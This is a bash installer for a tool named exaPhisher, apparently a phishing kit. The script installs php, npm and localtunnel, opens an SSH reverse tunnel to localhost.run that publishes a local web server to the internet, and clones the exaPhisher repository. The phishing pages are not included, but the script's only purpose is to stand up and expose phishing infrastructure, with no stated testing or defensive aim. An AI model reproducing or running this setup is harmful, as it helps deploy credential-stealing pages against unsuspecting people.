#!/bin/bash

# Function to display colored output
print_color() {
    case "$2" in
        "HEADER")    color='\033[95m' ;;
        "OKBLUE")    color='\033[34m' ;;
        "OKGREEN")   color='\033[92m' ;;
        "WARNING")   color='\033[93m' ;;
        "FAIL")      color='\033[91m' ;;
        "BOLD")      color='\033[1m' ;;
        "UNDERLINE") color='\033[4m' ;;
        "GREY")      color='\033[90m' ;;
        "BG_RED")    color='\033[41m' ;;
        *)           color='\033[0m' ;;
    esac
    echo -e "${color}${1}\033[0m"
}

# Clear screen
clear

# Prompt user if they are using Termux
# Prompt user if they are using Termux
read -p "Are you using Termux? [y/n]: " termux_choice
if [ "$termux_choice" = "y" ] || [ "$termux_choice" = "Y" ]; then
    TERMUX=true
else
    TERMUX=false
fi

# Check if running with sudo, but not in Termux
if [[ $EUID -ne 0 && $TERMUX == false ]]; then
    print_color "Please run this script with sudo." "FAIL"
    exit 1
fi

# Determine the system type automatically
if [[ -n "$(command -v pkg)" ]]; then
    # Termux
    TERMUX=true
elif [[ -n "$(command -v apt-get)" ]]; then
    # Debian based Linux
    DEBIAN=true
elif [[ -n "$(command -v pacman)" ]]; then
    # Arch based Linux
    ARCH=true
else
    print_color "Unsupported system." "FAIL"
    exit 1
fi

# Display ASCII art
print_color "
┏┓┏┓┏┳┓┳┳┏┓
┗┓┣  ┃ ┃┃┃┃
┗┛┗┛ ┻ ┗┛┣┛
" "OKGREEN"

# Display setup information
print_color "Welcome to exaphisher setup! Following packages will be installed:\n" "WARNING"
echo "- npm"
echo "- php"
echo -e "- localtunnel\n"

# Ask for confirmation to continue
read -p "Continue? [y/n]: " setup_choice
if [[ ! $setup_choice =~ ^[Yy]$ ]]; then
    print_color "Exiting setup..." "WARNING"
    exit 0
fi

# Clear screen
clear

# Install necessary packages based on the detected system
if [[ $TERMUX == true ]]; then
    # Termux setup
    print_color "Termux detected. Setting up..." "OKGREEN"
    pkg install -y openssh openssl php
    print_color "Setup completed successfully!" "OKGREEN"
    echo "Type python3 main.py to run exaPhisher!"
elif [[ $DEBIAN == true ]]; then
    # Debian based Linux setup
    print_color "Debian based Linux detected. Setting up..." "OKGREEN"
    if [[ -n $SUDO_USER ]]; then
        apt-get update
        apt-get install -y php npm
    else
        print_color "Please run this script with sudo." "FAIL"
        exit 1
    fi
    npm install -g localtunnel

    # Uncomment and modify if ngrok setup is needed for Debian
    # curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
    # echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
    # apt-get update
    # apt-get install -y ngrok
    # ngrok config add-authtoken YOUR_NGROK_TOKEN_HERE

    print_color "Setup completed successfully!" "OKGREEN"
    echo "Type python3 main.py to run exaPhisher!"
elif [[ $ARCH == true ]]; then
    # Arch based Linux setup
    print_color "Arch based Linux detected. Setting up..." "OKGREEN"
    if [[ -n $SUDO_USER ]]; then
        pacman -Sy --noconfirm php nodejs npm
    else
        print_color "Please run this script with sudo." "FAIL"
        exit 1
    fi
    npm install -g localtunnel

    # Uncomment and modify if ngrok setup is needed for Arch
    # yay -S --noconfirm ngrok
    # ngrok config add-authtoken YOUR_NGROK_TOKEN_HERE

    print_color "Setup completed successfully!" "OKGREEN"
    echo "Type python3 main.py to run exaPhisher!"
else
    print_color "Unsupported system." "FAIL"
    exit 1
fi

echo -e "===LH SETUP===\n\nWRITE yes AND PRESS ENTER\n"
sleep 2
ssh -R 80:localhost:8080 nokey@localhost.run

git clone https://github.com/SamueleAmato/exaPhisher
cd exaPhisher

# Create a version file
touch setup_ver.py

